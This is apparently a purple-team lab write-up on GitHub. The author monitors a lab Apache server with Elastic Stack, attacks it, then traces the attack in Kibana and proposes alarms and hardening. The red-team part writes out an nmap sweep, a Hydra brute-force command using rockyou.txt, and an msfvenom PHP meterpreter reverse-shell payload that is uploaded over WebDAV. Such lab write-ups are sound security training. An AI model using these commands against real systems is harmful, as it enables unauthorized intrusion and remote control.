# Purple Teaming

### Monitoring Setup Instructions

As I attack the webserver I need to make sure that my Elastic Stack is recording my activity.

I start by launching the Elastic Stack and Kibana on my monitoring server:


#### Filebeat Setup:

##### Commands Used:

```bash
filebeat modules enable apache
```

```bash
filebeat setup
```

![filebeat_setup.png](https://github.com/Sk3llington/Purple-Teaming/blob/main/images/filebeat_setup.png)


#### Metricbeat Setup:

##### Commands Used:


```bash
metricbeat modules enable apache
```

```bash
metricbeat setup
```

![metrcibeat_setup.png](https://github.com/Sk3llington/Purple-Teaming/blob/main/images/metricbeat_setup.png)


#### Packetbeat Setup:

##### Commands Used:

```bash
packetbeat setup
```

Commands used to restart all 3 services:

```bash
systemctl restart filebeat
```
```bash
systemctl restart metricbeat
```
```bash
systemctl restart packetbeat
```


## Red Team Engagement

Today, I will act as an offensive security Red Teamer to exploit a vulnerable Capstone Virtual Machine.

### The following tools will be used for this red team engagement:

- Firefox
- Hydra
- Nmap
- Crack Station
- Metasploit
- curl
- MSVenom


Now, it's time to search for the target webserver.

### Below, the `nmap` command I used to discover the IP address of the Linux web server and have all IPs discovered saved into the file `nmap_scanned_ips`:

```bash
nmap -sn 192.168.0.0/24 | awk '/Nmap scan/{gsub(/[()]/,"",$NF); print $NF > "nmap_scanned_ips"}'
```

Below is the list of IPs that Nmap has discovered on my virtual private network:

![nmap_scanned_ips](https://github.com/Sk3llington/Purple-Teaming/blob/main/images/nmap_scanned_ips.png)


Next, I run a service scan on all IPs except the IP of my Kali VM machine (192.168.1.90):


![nmap_webserver_nmap_lookup](https://github.com/Sk3llington/Purple-Teaming/blob/main/images/nmap_webserver_nmap_lookup.png)


I found the Linux Apache webserver I was looking for with the IP address `192.168.1.105` on port `80`.

Next, I open a web browser to access the webserver:

![webserver_webdirectory](https://github.com/Sk3llington/Purple-Teaming/blob/main/images/webserver_web_directory.png)


### Next, I am tasked with finding a secret folder and break into it. I used Firefox to navigate to the address of the webserver and start my reconnaissance work.

After reading the company's blog I found a lead on the location of the secret folder:

> 192.168.1.105/company_folder/company_culture/file1.txt

![secret_folder_clue](https://github.com/Sk3llington/Purple-Teaming/blob/main/images/secret_folder_clue.png)

Next, in the "meet our team" section I found an interesting text file with a clue about who is in charge of the folder. His name is Ashton:

> 192.168.1.105/meet_our_team/ashton.txt

![secret_folder_admin_ashton](https://github.com/Sk3llington/Purple-Teaming/blob/main/images/secret_folder_admin_ashton.png)


### Next, I used `Hydra` to brute force the access to the secret folder located at /company_folders/secret_folder.

I used the following command to brute force the access to the web page using `ashton` as the username and the `rockyou.txt` wordlist to brute force his password:

```bash
hydra -l ashton -P /usr/share/wordlists/rockyou.txt -s 80 -f -vV 192.168.1.105 http-get /company_folders/secret_folder
```

After 10,143 attempts, the password was cracked:

![hydra_brute_forced_password](https://github.com/Sk3llington/Purple-Teaming/blob/main/images/hydra_brute_forced_passwd.png)

Next, I use Ashton's credentials to acces the 'secret_folder'. In the secret folder I found a note that he left to himself, detailing how to connect to the company's webdav server:

> 192.168.1.105/company_folders/secret_folder/connect_to_corp_server

![ashton_instruction_webdav](https://github.com/Sk3llington/Purple-Teaming/blob/main/images/ashton_instructions_connect_webdav.png)


I noticed that a hash for ryan's account is displayed on the page. I decided to use the 'Crack Station' website to crack it. It was successful and I obtained what seems to be a password, i.e., `linux4u`.

![crack_station_cracked_hash](https://github.com/Sk3llington/Purple-Teaming/blob/main/images/Crack_station_cracked_hash.png)


Next, from the details left by Ashton on how to connect to the Webdav server, I figured out the path using the updated IP address (current address of the webserver 192.168.1.105) of their server and successfully accessed the login window and authenticated with the cracked credentials   `Ryan:linux4u` (i.e., Username: `Ryan` and password: `linux4u`).

![enter_pass_webdav](https://github.com/Sk3llington/Purple-Teaming/blob/main/images/enter_pass_webdav.png)

**Successfully logged in:**

![webdav_success_access](https://github.com/Sk3llington/Purple-Teaming/blob/main/images/webdav_success_access.png)


### Following the successful connection to the Webdav server, I dropped a PHP reverse Shell payload to gain remote access.

I used `msfvenom` to create my payload file named `exploit.php` with the following command:

```bash
/usr/bin/msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.1.90 LPORT=4444 R > exploit.php
```

![php_payload_creation](https://github.com/Sk3llington/Purple-Teaming/blob/main/images/php_payload_creation.png)


Next, I uploaded the reverse shell payload (exploit.php file) into the Webdav server:

![copy_paste_exploitPHP_in_webdav](https://github.com/Sk3llington/Purple-Teaming/blob/main/images/copy_paste_exploitPHP_in_webdav.png)



# Blue Team Forensics


## Identifying the offensive traffic


A considerable amount of data is available in the logs. Upon inspection, I was able to identify the malicious traffic and activity generated by my attacking machine.
Through the log inspection, I was able to obtain the following evidence of malicious activity:

- Traffic between my attacking VM and target VM, more specifically, the unusually high volume of requests
- Acces to the 'secret_folder' directory
- The brute force attack against the HTTP server
- The POST request corresponding to the upload of the 'exploit.php' file

Below, the unusually high volume of requests and failed responses between my attacking VM and the target:


![identifying_port_scan](https://github.com/Sk3llington/Purple-Teaming/blob/main/images/identifying_port_scan.png)

The requests were made from the IP address **`192.168.1.90`**, my Kali Virtual Machine used to attack the target.

![identifying_port_scan](https://github.com/Sk3llington/Purple-Teaming/blob/main/images/identifying_port_scan_2.png)

![error_vs_success_transac](https://github.com/Sk3llington/Purple-Teaming/blob/main/images/brute_force_attack_error_vs_successful_transac.png)

I can see that the port scan I performed using `nmap` was logged which shows that the interaction between the attacker and the target machines occured on Sep 15, 2021 @ 02:55:00.


- What responses did the victim send back?

Since I know when the interaction between my attacking machine and the target machine occured, I set the date and time to Sep 15, 2021 @ 02:55:00 and refresh my "HTTP Status Codes For The Top Queries" dashboard. Next, I looked at the top responses that the target machine sent back from my dashboard. The codes returned are `401`, `301`, `200`, `403`, `204`:

![responses_sent_back_by_victim](https://github.com/Sk3llington/Purple-Teaming/blob/main/images/responses_sent_back_by_victim.png)


## Finding the request for the hidden directory

### Access to sensitive data:

107,601 requests were made to the hidden directory 'secret_folder'. between Sep 15, 2021 @ 02:55:00 and Sep 15, 2021 @ 03:12:00


![requested_file_report](https://github.com/Sk3llington/Purple-Teaming/blob/main/images/requested_file_report.png)

Below, the additional requests made after the successful brute force attack, i.e., the attacker successfully gaining access to the 'secret_folder/'. The attacker accessed the folder **6** times out of **107,601** attempts.


### HTTP brute force attack

When searching for the `url.path` "/company_folders/secret_folder/", I found the evidence of the HTTP brute force attack allowing me access to the 'secret_folder' during the red team engagement. I was also able to find clues that `Hydra` was used for the brute force attack by looking at the section `user_agent.original`:

![brute_force_hydra_clue](https://github.com/Sk3llington/Purple-Teaming/blob/main/images/brute_force_Hydra_clue.png)


### Identifying the Webdav connection and upload of the `exploit.php` file

The logs indicate that an unauthorized actor was able to access protected data in the 'Webdav' directory. I can see that the 'passwd.dav' file was requested via GET, and 'exploit.php' was uploaded via POST.

![webdav_directory_requests](https://github.com/Sk3llington/Purple-Teaming/blob/main/images/webdav_directory_requests.png)


## Mitigations

### Blocking the Port Scan

#### Alarm:

- An alarm can be set to detect unsually high volume of requests per second, with a threshold of 10 requests per second for more than 5 seconds for any given IP.

#### System hardening:

- ICMP traffic can be filtered.
- An IP allowed list can be enabled.
- Be proactive and scan networks regurlarly, analyze the results and address any vulnerabilities.
- Close all ports that are not truly needed or block them with a firewall.


### Finding the Request for the Hidden Directory

#### Alarm:

- An alarm can be set to go off if the incoming IP is not on the allowed list of IP addresses.

#### System Hardening:

- Access to the sensitive file can be locally restricted to a specific user. Getting access to a web shell with a different user account won't allow access.
- Files should be encrypted at rest.


### Preventing Brute Force Attacks

#### Alarm:

- An alarm should be triggered when more than 100 requests per seconds for a duratin of 5 seconds is detected
- An alarm should be triggered when an IP address that is not allowed is trying to authenticate

#### System Hardening:

- Limit failed login attempts
- Limit logins to a specified IP address
- Two factor authentication
- Unique login URLs

